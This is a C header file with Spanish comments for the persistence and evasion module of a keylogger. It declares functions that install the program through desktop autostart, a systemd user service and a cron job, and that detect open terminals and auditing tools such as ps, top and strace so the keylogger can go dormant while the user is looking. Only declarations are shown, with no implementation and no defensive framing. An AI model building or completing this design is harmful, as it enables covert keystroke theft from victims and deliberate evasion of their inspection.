#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <time.h>

/**
 * Estados de operación del keylogger
 */
typedef enum {
    STATE_NORMAL = 0,      // Capturando activamente
    STATE_SLEEP = 1,       // En reposo, detectó amenaza
    STATE_SUSPENDED = 2    // Completamente suspendido
} OperationState;

/**
 * Estructura para gestionar el estado de persistencia
 */
typedef struct {
    OperationState state;
    time_t state_changed_at;
    time_t last_threat_check;
    int consecutive_safe_checks;
    int sleep_threshold;      // Chequeos sin amenazas antes de despertar (default: 12 = ~60s)
} PersistenceState;

// ========== MECANISMOS DE PERSISTENCIA ==========

/**
 * Instala entrada autostart en ~/.config/autostart/
 * Se ejecuta al iniciar sesión X11/GNOME/KDE
 */
int install_autostart_entry(const char *binary_path);

/**
 * Instala servicio systemd en ~/.config/systemd/user/
 * Se ejecuta automáticamente tras reinicio
 */
int install_systemd_service(const char *binary_path);

/**
 * Instala cron job para verificar proceso activo
 */
int install_cron_job(const char *binary_path);

// ========== DETECCIÓN DE AMENAZAS ==========

/**
 * Detecta si hay terminales abiertas en /dev/pts/
 * @return 1 si hay terminal activa, 0 si no
 */
int detect_active_terminals(void);

/**
 * Detecta herramientas de auditoría (ps, top, strace, etc.)
 * @return 1 si detecta auditoría activa, 0 si no
 */
int detect_auditing_tools(void);

/**
 * Evalúa si hay actividad sospechosa en general
 * @return 1 si hay amenaza, 0 si es seguro
 */
int is_user_suspicious(void);

// ========== GESTIÓN DE ESTADO ==========

extern PersistenceState g_persist_state;

/**
 * Obtiene el estado operacional actual
 */
OperationState get_current_state(void);

/**
 * Cambia el estado operacional
 */
void set_operation_state(OperationState state);

/**
 * Actualiza el estado basado en detecciones periódicas
 * Debe llamarse cada 5 segundos desde el loop principal
 */
void update_persistence_state(void);

/**
 * Convierte estado a string legible
 */
const char* state_to_string(OperationState state);

#endif
